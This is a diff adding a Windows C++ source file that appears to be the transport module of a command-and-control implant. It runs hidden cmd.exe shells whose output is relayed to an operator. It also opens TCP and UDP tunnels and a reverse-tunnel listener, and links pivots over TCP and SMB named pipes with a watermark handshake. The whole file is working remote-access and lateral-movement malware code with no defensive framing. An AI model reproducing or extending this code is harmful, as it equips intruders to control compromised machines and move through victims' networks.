@@ -1,0 +1,828 @@
+#include "TransportScaffold.h"
+
+#include "AsyncQueue.h"
+#include "../protocol/protocol.h"
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#include <atomic>
+#include <map>
+#include <memory>
+#include <string>
+#include <thread>
+#include <vector>
+
+namespace {
+struct ShellSession {
+    uint32_t jobId = 0;
+    PROCESS_INFORMATION pi = {};
+    HANDLE stdinWrite = NULL;
+    HANDLE stdoutRead = NULL;
+    std::atomic<bool> closed = false;
+};
+
+struct TunnelSession {
+    uint32_t id = 0;
+    uint32_t tunnelType = 0;
+    SOCKET sock = INVALID_SOCKET;
+    SOCKET listener = INVALID_SOCKET;
+    std::atomic<bool> paused = false;
+    std::atomic<bool> closed = false;
+};
+
+struct PivotSession {
+    uint32_t id = 0;
+    uint8_t kind = 0;
+    SOCKET sock = INVALID_SOCKET;
+    HANDLE pipe = INVALID_HANDLE_VALUE;
+    std::atomic<bool> closed = false;
+};
+
+struct TransportState {
+    CRITICAL_SECTION lock;
+    std::map<uint32_t, std::shared_ptr<ShellSession>> shells;
+    std::map<uint32_t, std::shared_ptr<TunnelSession>> tunnels;
+    std::map<uint32_t, std::shared_ptr<PivotSession>> pivots;
+    std::atomic<uint32_t> nextTunnelId;
+    bool wsaStarted;
+
+    TransportState() : nextTunnelId(0x70000000), wsaStarted(false) {
+        InitializeCriticalSection(&lock);
+        WSADATA wsa = {};
+        if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) {
+            wsaStarted = true;
+        }
+    }
+
+    ~TransportState() {
+        if (wsaStarted) {
+            WSACleanup();
+        }
+        DeleteCriticalSection(&lock);
+    }
+};
+
+TransportState& state()
+{
+    static TransportState s;
+    return s;
+}
+
+std::vector<uint8_t> writerToVector(WriterBE* w)
+{
+    std::vector<uint8_t> out;
+    if (w && w->size > 0 && w->data) {
+        out.assign(w->data, w->data + w->size);
+    }
+    if (w) {
+        WriterBEFree(w);
+    }
+    return out;
+}
+
+std::vector<uint8_t> tunnelStatusPayload(uint32_t tunnelType, uint32_t result)
+{
+    WriterBE* w = WriterBEInit(16);
+    WriterBEWriteUint32(w, tunnelType);
+    WriterBEWriteUint32(w, result);
+    return writerToVector(w);
+}
+
+void queueTunnelClose(uint32_t channelId, uint32_t tunnelType, uint32_t result)
+{
+    std::vector<uint8_t> payload = tunnelStatusPayload(tunnelType, result);
+    async_queue::QueueBinaryResponse(channelId, COMMAND_TUNNEL_CLOSE, payload.data(), (uint32_t)payload.size());
+}
+
+void queueShellOutput(uint32_t shellId, uint8_t stateCode, const char* text, uint32_t textLen)
+{
+    WriterBE* w = WriterBEInit(textLen + 32);
+    WriterBEWriteUint8(w, JOB_TYPE_SHELL);
+    WriterBEWriteUint8(w, stateCode);
+    if (text) {
+        std::string chunk(text, text + textLen);
+        WriterBEWriteString(w, chunk.c_str());
+    }
+    std::vector<uint8_t> payload = writerToVector(w);
+    async_queue::QueueBinaryResponse(shellId, COMMAND_JOB, payload.data(), (uint32_t)payload.size());
+}
+
+void queueShellState(uint32_t shellId, uint8_t stateCode)
+{
+    WriterBE* w = WriterBEInit(8);
+    WriterBEWriteUint8(w, JOB_TYPE_SHELL);
+    WriterBEWriteUint8(w, stateCode);
+    std::vector<uint8_t> payload = writerToVector(w);
+    async_queue::QueueBinaryResponse(shellId, COMMAND_JOB, payload.data(), (uint32_t)payload.size());
+}
+
+void closeShellHandles(const std::shared_ptr<ShellSession>& session)
+{
+    if (!session || session->closed.exchange(true)) {
+        return;
+    }
+    if (session->stdinWrite) {
+        CloseHandle(session->stdinWrite);
+        session->stdinWrite = NULL;
+    }
+    if (session->stdoutRead) {
+        CloseHandle(session->stdoutRead);
+        session->stdoutRead = NULL;
+    }
+    if (session->pi.hThread) {
+        CloseHandle(session->pi.hThread);
+        session->pi.hThread = NULL;
+    }
+    if (session->pi.hProcess) {
+        TerminateProcess(session->pi.hProcess, 0);
+        CloseHandle(session->pi.hProcess);
+        session->pi.hProcess = NULL;
+    }
+}
+
+void shellReadLoop(const std::shared_ptr<ShellSession>& session)
+{
+    char buffer[4096];
+    DWORD bytesRead = 0;
+    while (session && session->stdoutRead && ReadFile(session->stdoutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
+        queueShellOutput(session->jobId, JOB_STATE_RUNNING, buffer, bytesRead);
+    }
+
+    if (session && session->pi.hProcess) {
+        WaitForSingleObject(session->pi.hProcess, INFINITE);
+    }
+
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    s.shells.erase(session->jobId);
+    LeaveCriticalSection(&s.lock);
+
+    closeShellHandles(session);
+    queueShellState(session->jobId, JOB_STATE_KILLED);
+}
+
+SOCKET connectSocket(const char* address, uint16_t port, int type, int proto, DWORD timeoutMs, DWORD* outError)
+{
+    SOCKET sock = socket(AF_INET, type, proto);
+    if (sock == INVALID_SOCKET) {
+        if (outError) *outError = WSAGetLastError();
+        return INVALID_SOCKET;
+    }
+
+    sockaddr_in addr = {};
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    if (inet_pton(AF_INET, address, &addr.sin_addr) != 1) {
+        hostent* he = gethostbyname(address);
+        if (!he || he->h_length <= 0) {
+            if (outError) *outError = WSAHOST_NOT_FOUND;
+            closesocket(sock);
+            return INVALID_SOCKET;
+        }
+        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
+    }
+
+    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+        if (outError) *outError = WSAGetLastError();
+        closesocket(sock);
+        return INVALID_SOCKET;
+    }
+
+    if (timeoutMs > 0) {
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeoutMs, sizeof(timeoutMs));
+    }
+    return sock;
+}
+
+void closeTunnel(const std::shared_ptr<TunnelSession>& session)
+{
+    if (!session || session->closed.exchange(true)) {
+        return;
+    }
+    if (session->sock != INVALID_SOCKET) {
+        shutdown(session->sock, SD_BOTH);
+        closesocket(session->sock);
+        session->sock = INVALID_SOCKET;
+    }
+    if (session->listener != INVALID_SOCKET) {
+        closesocket(session->listener);
+        session->listener = INVALID_SOCKET;
+    }
+}
+
+void tunnelReadLoop(const std::shared_ptr<TunnelSession>& session, bool udp)
+{
+    (void)udp;
+    BYTE buffer[64 * 1024];
+    while (session && !session->closed.load()) {
+        int n = recv(session->sock, (char*)buffer, sizeof(buffer), 0);
+        if (n > 0) {
+            if (!session->paused.load()) {
+                WriterBE* w = WriterBEInit((uint32_t)n + 8);
+                WriterBEWriteBytes(w, buffer, (uint32_t)n);
+                std::vector<uint8_t> payload = writerToVector(w);
+                async_queue::QueueBinaryResponse(session->id, COMMAND_TUNNEL_WRITE_TCP, payload.data(), (uint32_t)payload.size());
+            }
+            continue;
+        }
+        int wsaErr = WSAGetLastError();
+        if (n == SOCKET_ERROR && (wsaErr == WSAETIMEDOUT || wsaErr == WSAEWOULDBLOCK || wsaErr == WSAEINTR)) {
+            continue;
+        }
+        break;
+    }
+
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    s.tunnels.erase(session->id);
+    LeaveCriticalSection(&s.lock);
+    uint32_t tunnelType = session->tunnelType;
+    uint32_t tunnelId = session->id;
+    closeTunnel(session);
+    queueTunnelClose(tunnelId, tunnelType, 1);
+}
+
+void reverseAcceptLoop(uint32_t parentId, SOCKET listener)
+{
+    while (true) {
+        SOCKET client = accept(listener, NULL, NULL);
+        if (client == INVALID_SOCKET) {
+            break;
+        }
+        DWORD readTimeout = 500;
+        setsockopt(client, SOL_SOCKET, SO_RCVTIMEO, (const char*)&readTimeout, sizeof(readTimeout));
+
+        uint32_t channelId = state().nextTunnelId.fetch_add(1) + 1;
+        std::shared_ptr<TunnelSession> child(new TunnelSession());
+        child->id = channelId;
+        child->tunnelType = transport_scaffold::REVERSE_TUNNEL_TYPE;
+        child->sock = client;
+
+        TransportState& s = state();
+        EnterCriticalSection(&s.lock);
+        s.tunnels[channelId] = child;
+        LeaveCriticalSection(&s.lock);
+
+        WriterBE* w = WriterBEInit(16);
+        WriterBEWriteUint32(w, channelId);
+        std::vector<uint8_t> payload = writerToVector(w);
+        async_queue::QueueBinaryResponse(parentId, COMMAND_TUNNEL_ACCEPT, payload.data(), (uint32_t)payload.size());
+
+        std::thread(tunnelReadLoop, child, false).detach();
+    }
+}
+
+std::string normalizePipePath(const char* pipeName)
+{
+    if (!pipeName || !pipeName[0]) {
+        return std::string();
+    }
+    std::string name(pipeName);
+    if (name.rfind("\\\\", 0) == 0) {
+        return name;
+    }
+    if (name.rfind("pipe\\", 0) == 0) {
+        return std::string("\\\\.\\") + name;
+    }
+    return std::string("\\\\.\\pipe\\") + name;
+}
+
+BOOL readPivotHandshakeTcp(SOCKET sock, uint8_t kind, std::vector<uint8_t>* outPayload, DWORD* outError)
+{
+    BYTE hdr[4] = {0};
+    int got = recv(sock, (char*)hdr, 4, MSG_WAITALL);
+    if (got != 4) {
+        if (outError) *outError = WSAGetLastError();
+        return FALSE;
+    }
+    uint32_t size = (uint32_t)hdr[0] | ((uint32_t)hdr[1] << 8) | ((uint32_t)hdr[2] << 16) | ((uint32_t)hdr[3] << 24);
+    if (size == 0 || size > 4 * 1024 * 1024) {
+        if (outError) *outError = ERROR_INVALID_DATA;
+        return FALSE;
+    }
+    std::vector<uint8_t> frame(size);
+    int total = 0;
+    while (total < (int)size) {
+        int chunk = recv(sock, (char*)(frame.data() + total), (int)size - total, 0);
+        if (chunk <= 0) {
+            if (outError) *outError = WSAGetLastError();
+            return FALSE;
+        }
+        total += chunk;
+    }
+    if (frame.size() < 4) {
+        if (outError) *outError = ERROR_INVALID_DATA;
+        return FALSE;
+    }
+    uint32_t watermark = (uint32_t)frame[0] | ((uint32_t)frame[1] << 8) | ((uint32_t)frame[2] << 16) | ((uint32_t)frame[3] << 24);
+    WriterBE* w = WriterBEInit((uint32_t)frame.size() + 8);
+    WriterBEWriteUint8(w, kind);
+    WriterBEWriteUint32(w, watermark);
+    WriterBEWriteBytes(w, frame.data() + 4, (uint32_t)frame.size() - 4);
+    *outPayload = writerToVector(w);
+    return TRUE;
+}
+
+BOOL readPivotHandshakePipe(HANDLE pipe, uint8_t kind, std::vector<uint8_t>* outPayload, DWORD* outError)
+{
+    BYTE buf[8192];
+    DWORD bytesRead = 0;
+    if (!ReadFile(pipe, buf, sizeof(buf), &bytesRead, NULL) || bytesRead < 4) {
+        if (outError) *outError = GetLastError();
+        return FALSE;
+    }
+
+    const BYTE* payload = buf;
+    DWORD payloadLen = bytesRead;
+    if (bytesRead >= 8) {
+        uint32_t declared = (uint32_t)buf[0] | ((uint32_t)buf[1] << 8) | ((uint32_t)buf[2] << 16) | ((uint32_t)buf[3] << 24);
+        if (declared > 0 && declared == bytesRead - 4) {
+            payload = buf + 4;
+            payloadLen = bytesRead - 4;
+        }
+    }
+    if (payloadLen < 4) {
+        if (outError) *outError = ERROR_INVALID_DATA;
+        return FALSE;
+    }
+
+    uint32_t watermark = (uint32_t)payload[0] | ((uint32_t)payload[1] << 8) | ((uint32_t)payload[2] << 16) | ((uint32_t)payload[3] << 24);
+    WriterBE* w = WriterBEInit(payloadLen + 8);
+    WriterBEWriteUint8(w, kind);
+    WriterBEWriteUint32(w, watermark);
+    WriterBEWriteBytes(w, payload + 4, payloadLen - 4);
+    *outPayload = writerToVector(w);
+    return TRUE;
+}
+
+void queuePivotData(uint32_t pivotId, const uint8_t* data, uint32_t len)
+{
+    WriterBE* w = WriterBEInit(len + 16);
+    WriterBEWriteUint32(w, pivotId);
+    WriterBEWriteBytes(w, data, len);
+    std::vector<uint8_t> payload = writerToVector(w);
+    async_queue::QueueBinaryResponse(0, COMMAND_PIVOT_EXEC, payload.data(), (uint32_t)payload.size());
+}
+
+void closePivot(const std::shared_ptr<PivotSession>& session)
+{
+    if (!session || session->closed.exchange(true)) {
+        return;
+    }
+    if (session->sock != INVALID_SOCKET) {
+        shutdown(session->sock, SD_BOTH);
+        closesocket(session->sock);
+        session->sock = INVALID_SOCKET;
+    }
+    if (session->pipe != INVALID_HANDLE_VALUE) {
+        CloseHandle(session->pipe);
+        session->pipe = INVALID_HANDLE_VALUE;
+    }
+}
+
+void closePivotSessionAsync(uint32_t pivotId)
+{
+    std::shared_ptr<PivotSession> session;
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    std::map<uint32_t, std::shared_ptr<PivotSession>>::iterator it = s.pivots.find(pivotId);
+    if (it != s.pivots.end()) {
+        session = it->second;
+        s.pivots.erase(it);
+    }
+    LeaveCriticalSection(&s.lock);
+
+    if (!session) {
+        return;
+    }
+
+    closePivot(session);
+
+    WriterBE* w = WriterBEInit(16);
+    WriterBEWriteUint32(w, pivotId);
+    WriterBEWriteUint8(w, transport_scaffold::PIVOT_TYPE_DISCONNECT);
+    std::vector<uint8_t> payload = writerToVector(w);
+    async_queue::QueueBinaryResponse(0, COMMAND_UNLINK, payload.data(), (uint32_t)payload.size());
+}
+
+void pivotReadLoopTcp(uint32_t pivotId, SOCKET sock)
+{
+    while (true) {
+        BYTE hdr[4] = {0};
+        int got = recv(sock, (char*)hdr, 4, MSG_WAITALL);
+        if (got != 4) {
+            break;
+        }
+        uint32_t size = (uint32_t)hdr[0] | ((uint32_t)hdr[1] << 8) | ((uint32_t)hdr[2] << 16) | ((uint32_t)hdr[3] << 24);
+        if (size == 0 || size > 4 * 1024 * 1024) {
+            break;
+        }
+        std::vector<uint8_t> payload(size);
+        int total = 0;
+        while (total < (int)size) {
+            int chunk = recv(sock, (char*)(payload.data() + total), (int)size - total, 0);
+            if (chunk <= 0) {
+                total = -1;
+                break;
+            }
+            total += chunk;
+        }
+        if (total < 0) {
+            break;
+        }
+        queuePivotData(pivotId, payload.data(), (uint32_t)payload.size());
+    }
+    closePivotSessionAsync(pivotId);
+}
+
+void pivotReadLoopPipe(uint32_t pivotId, HANDLE pipe)
+{
+    BYTE buffer[8192];
+    DWORD bytesRead = 0;
+    while (ReadFile(pipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
+        queuePivotData(pivotId, buffer, bytesRead);
+    }
+    closePivotSessionAsync(pivotId);
+}
+}
+
+namespace transport_scaffold {
+
+std::vector<uint32_t> ShellJobEntries()
+{
+    std::vector<uint32_t> out;
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    for (std::map<uint32_t, std::shared_ptr<ShellSession>>::const_iterator it = s.shells.begin(); it != s.shells.end(); ++it) {
+        out.push_back(it->first);
+    }
+    LeaveCriticalSection(&s.lock);
+    return out;
+}
+
+BOOL StartShellSession(uint32_t shellId, const char* programArgs, DWORD* outError)
+{
+    SECURITY_ATTRIBUTES sa = {};
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = TRUE;
+
+    HANDLE stdinRead = NULL, stdinWrite = NULL;
+    HANDLE stdoutRead = NULL, stdoutWrite = NULL;
+    if (!CreatePipe(&stdinRead, &stdinWrite, &sa, 0) || !CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0)) {
+        if (outError) *outError = GetLastError();
+        if (stdinRead) CloseHandle(stdinRead);
+        if (stdinWrite) CloseHandle(stdinWrite);
+        if (stdoutRead) CloseHandle(stdoutRead);
+        if (stdoutWrite) CloseHandle(stdoutWrite);
+        return FALSE;
+    }
+    SetHandleInformation(stdinWrite, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(stdoutRead, HANDLE_FLAG_INHERIT, 0);
+
+    std::string cmd = (programArgs && programArgs[0]) ? std::string(programArgs) : std::string("cmd.exe");
+    std::vector<char> cmdLine(cmd.begin(), cmd.end());
+    cmdLine.push_back('\0');
+
+    STARTUPINFOA si = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    si.wShowWindow = SW_HIDE;
+    si.hStdInput = stdinRead;
+    si.hStdOutput = stdoutWrite;
+    si.hStdError = stdoutWrite;
+
+    PROCESS_INFORMATION pi = {};
+    if (!CreateProcessA(NULL, cmdLine.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        if (outError) *outError = GetLastError();
+        CloseHandle(stdinRead);
+        CloseHandle(stdinWrite);
+        CloseHandle(stdoutRead);
+        CloseHandle(stdoutWrite);
+        return FALSE;
+    }
+
+    CloseHandle(stdinRead);
+    CloseHandle(stdoutWrite);
+
+    std::shared_ptr<ShellSession> session(new ShellSession());
+    session->jobId = shellId;
+    session->pi = pi;
+    session->stdinWrite = stdinWrite;
+    session->stdoutRead = stdoutRead;
+
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    s.shells[shellId] = session;
+    LeaveCriticalSection(&s.lock);
+
+    std::thread(shellReadLoop, session).detach();
+    return TRUE;
+}
+
+BOOL WriteShellInput(uint32_t shellId, const uint8_t* data, uint32_t len, DWORD* outError)
+{
+    std::shared_ptr<ShellSession> session;
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    std::map<uint32_t, std::shared_ptr<ShellSession>>::iterator it = s.shells.find(shellId);
+    if (it != s.shells.end()) {
+        session = it->second;
+    }
+    LeaveCriticalSection(&s.lock);
+    if (!session || !session->stdinWrite) {
+        if (outError) *outError = ERROR_FILE_NOT_FOUND;
+        return FALSE;
+    }
+    DWORD written = 0;
+    if (!WriteFile(session->stdinWrite, data, len, &written, NULL)) {
+        if (outError) *outError = GetLastError();
+        return FALSE;
+    }
+    return written == len;
+}
+
+BOOL CloseShellSession(uint32_t shellId)
+{
+    std::shared_ptr<ShellSession> session;
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    std::map<uint32_t, std::shared_ptr<ShellSession>>::iterator it = s.shells.find(shellId);
+    if (it != s.shells.end()) {
+        session = it->second;
+        s.shells.erase(it);
+    }
+    LeaveCriticalSection(&s.lock);
+    if (!session) {
+        return FALSE;
+    }
+    closeShellHandles(session);
+    return TRUE;
+}
+
+BOOL KillShellJob(uint32_t shellId)
+{
+    return CloseShellSession(shellId);
+}
+
+BOOL StartTcpTunnel(uint32_t channelId, uint32_t tunnelType, const char* address, uint16_t port, std::vector<uint8_t>* outPayload, DWORD* outError)
+{
+    SOCKET sock = connectSocket(address, port, SOCK_STREAM, IPPROTO_TCP, 500, outError);
+    if (sock == INVALID_SOCKET) {
+        if (outPayload) *outPayload = tunnelStatusPayload(tunnelType, outError ? *outError : 1);
+        return FALSE;
+    }
+
+    std::shared_ptr<TunnelSession> session(new TunnelSession());
+    session->id = channelId;
+    session->tunnelType = tunnelType;
+    session->sock = sock;
+
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    s.tunnels[channelId] = session;
+    LeaveCriticalSection(&s.lock);
+
+    if (outPayload) {
+        *outPayload = tunnelStatusPayload(tunnelType, 0);
+    }
+    std::thread(tunnelReadLoop, session, false).detach();
+    return TRUE;
+}
+
+BOOL StartUdpTunnel(uint32_t channelId, const char* address, uint16_t port, std::vector<uint8_t>* outPayload, DWORD* outError)
+{
+    SOCKET sock = connectSocket(address, port, SOCK_DGRAM, IPPROTO_UDP, 500, outError);
+    if (sock == INVALID_SOCKET) {
+        if (outPayload) *outPayload = tunnelStatusPayload(2, outError ? *outError : 1);
+        return FALSE;
+    }
+
+    std::shared_ptr<TunnelSession> session(new TunnelSession());
+    session->id = channelId;
+    session->tunnelType = 2;
+    session->sock = sock;
+
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    s.tunnels[channelId] = session;
+    LeaveCriticalSection(&s.lock);
+
+    if (outPayload) {
+        *outPayload = tunnelStatusPayload(2, 0);
+    }
+    std::thread(tunnelReadLoop, session, true).detach();
+    return TRUE;
+}
+
+std::vector<uint8_t> StartReverseTunnel(uint32_t tunnelId, uint16_t port)
+{
+    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (listener == INVALID_SOCKET) {
+        return tunnelStatusPayload(REVERSE_TUNNEL_TYPE, WSAGetLastError());
+    }
+
+    sockaddr_in addr = {};
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    addr.sin_port = htons(port);
+    if (bind(listener, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR || listen(listener, SOMAXCONN) == SOCKET_ERROR) {
+        DWORD err = WSAGetLastError();
+        closesocket(listener);
+        return tunnelStatusPayload(REVERSE_TUNNEL_TYPE, err ? err : 1);
+    }
+
+    std::shared_ptr<TunnelSession> session(new TunnelSession());
+    session->id = tunnelId;
+    session->tunnelType = REVERSE_TUNNEL_TYPE;
+    session->listener = listener;
+
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    s.tunnels[tunnelId] = session;
+    LeaveCriticalSection(&s.lock);
+
+    std::thread(reverseAcceptLoop, tunnelId, listener).detach();
+    return tunnelStatusPayload(REVERSE_TUNNEL_TYPE, 0);
+}
+
+BOOL WriteTunnelData(uint32_t channelId, const uint8_t* data, uint32_t len, DWORD* outError)
+{
+    std::shared_ptr<TunnelSession> session;
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    std::map<uint32_t, std::shared_ptr<TunnelSession>>::iterator it = s.tunnels.find(channelId);
+    if (it != s.tunnels.end()) {
+        session = it->second;
+    }
+    LeaveCriticalSection(&s.lock);
+    if (!session || session->sock == INVALID_SOCKET) {
+        if (outError) *outError = WSAENOTCONN;
+        return FALSE;
+    }
+    int sent = send(session->sock, (const char*)data, (int)len, 0);
+    if (sent == SOCKET_ERROR || (uint32_t)sent != len) {
+        if (outError) *outError = WSAGetLastError();
+        return FALSE;
+    }
+    return TRUE;
+}
+
+void NoteTunnelWriteFailure(uint32_t channelId, uint32_t result)
+{
+    queueTunnelClose(channelId, 0, result);
+}
+
+void SetTunnelPaused(uint32_t channelId, BOOL paused)
+{
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    std::map<uint32_t, std::shared_ptr<TunnelSession>>::iterator it = s.tunnels.find(channelId);
+    if (it != s.tunnels.end()) {
+        it->second->paused.store(paused ? true : false);
+    }
+    LeaveCriticalSection(&s.lock);
+}
+
+BOOL CloseTunnelSession(uint32_t channelId)
+{
+    std::shared_ptr<TunnelSession> session;
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    std::map<uint32_t, std::shared_ptr<TunnelSession>>::iterator it = s.tunnels.find(channelId);
+    if (it != s.tunnels.end()) {
+        session = it->second;
+        s.tunnels.erase(it);
+    }
+    LeaveCriticalSection(&s.lock);
+    if (!session) {
+        return FALSE;
+    }
+    closeTunnel(session);
+    return TRUE;
+}
+
+BOOL StartPivotTcp(uint32_t pivotId, const char* address, uint16_t port, std::vector<uint8_t>* outPayload, DWORD* outError)
+{
+    SOCKET sock = connectSocket(address, port, SOCK_STREAM, IPPROTO_TCP, 5000, outError);
+    if (sock == INVALID_SOCKET) {
+        return FALSE;
+    }
+
+    std::vector<uint8_t> payload;
+    if (!readPivotHandshakeTcp(sock, PIVOT_TYPE_TCP, &payload, outError)) {
+        closesocket(sock);
+        return FALSE;
+    }
+
+    std::shared_ptr<PivotSession> session(new PivotSession());
+    session->id = pivotId;
+    session->kind = PIVOT_TYPE_TCP;
+    session->sock = sock;
+
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    s.pivots[pivotId] = session;
+    LeaveCriticalSection(&s.lock);
+
+    if (outPayload) {
+        *outPayload = payload;
+    }
+    std::thread(pivotReadLoopTcp, pivotId, sock).detach();
+    return TRUE;
+}
+
+BOOL StartPivotSmb(uint32_t pivotId, const char* pipeName, std::vector<uint8_t>* outPayload, DWORD* outError)
+{
+    std::string path = normalizePipePath(pipeName);
+    HANDLE pipe = CreateFileA(path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (pipe == INVALID_HANDLE_VALUE) {
+        if (outError) *outError = GetLastError();
+        return FALSE;
+    }
+
+    std::vector<uint8_t> payload;
+    if (!readPivotHandshakePipe(pipe, PIVOT_TYPE_SMB, &payload, outError)) {
+        CloseHandle(pipe);
+        return FALSE;
+    }
+
+    std::shared_ptr<PivotSession> session(new PivotSession());
+    session->id = pivotId;
+    session->kind = PIVOT_TYPE_SMB;
+    session->pipe = pipe;
+
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    s.pivots[pivotId] = session;
+    LeaveCriticalSection(&s.lock);
+
+    if (outPayload) {
+        *outPayload = payload;
+    }
+    std::thread(pivotReadLoopPipe, pivotId, pipe).detach();
+    return TRUE;
+}
+
+BOOL WritePivotData(uint32_t pivotId, const uint8_t* data, uint32_t len, DWORD* outError)
+{
+    std::shared_ptr<PivotSession> session;
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    std::map<uint32_t, std::shared_ptr<PivotSession>>::iterator it = s.pivots.find(pivotId);
+    if (it != s.pivots.end()) {
+        session = it->second;
+    }
+    LeaveCriticalSection(&s.lock);
+    if (!session) {
+        if (outError) *outError = ERROR_FILE_NOT_FOUND;
+        return FALSE;
+    }
+
+    if (session->sock != INVALID_SOCKET) {
+        BYTE hdr[4];
+        hdr[0] = (BYTE)(len);
+        hdr[1] = (BYTE)(len >> 8);
+        hdr[2] = (BYTE)(len >> 16);
+        hdr[3] = (BYTE)(len >> 24);
+        if (send(session->sock, (const char*)hdr, 4, 0) != 4 || send(session->sock, (const char*)data, (int)len, 0) == SOCKET_ERROR) {
+            if (outError) *outError = WSAGetLastError();
+            return FALSE;
+        }
+        return TRUE;
+    }
+
+    if (session->pipe != INVALID_HANDLE_VALUE) {
+        DWORD written = 0;
+        if (!WriteFile(session->pipe, data, len, &written, NULL) || written != len) {
+            if (outError) *outError = GetLastError();
+            return FALSE;
+        }
+        return TRUE;
+    }
+
+    if (outError) *outError = ERROR_INVALID_HANDLE;
+    return FALSE;
+}
+
+uint8_t ClosePivotSession(uint32_t pivotId)
+{
+    std::shared_ptr<PivotSession> session;
+    TransportState& s = state();
+    EnterCriticalSection(&s.lock);
+    std::map<uint32_t, std::shared_ptr<PivotSession>>::iterator it = s.pivots.find(pivotId);
+    if (it != s.pivots.end()) {
+        session = it->second;
+        s.pivots.erase(it);
+    }
+    LeaveCriticalSection(&s.lock);
+    if (!session) {
+        return 0;
+    }
+
+    uint8_t kind = session->kind;
+    closePivot(session);
+    return kind;
+}
+
+} // namespace transport_scaffold
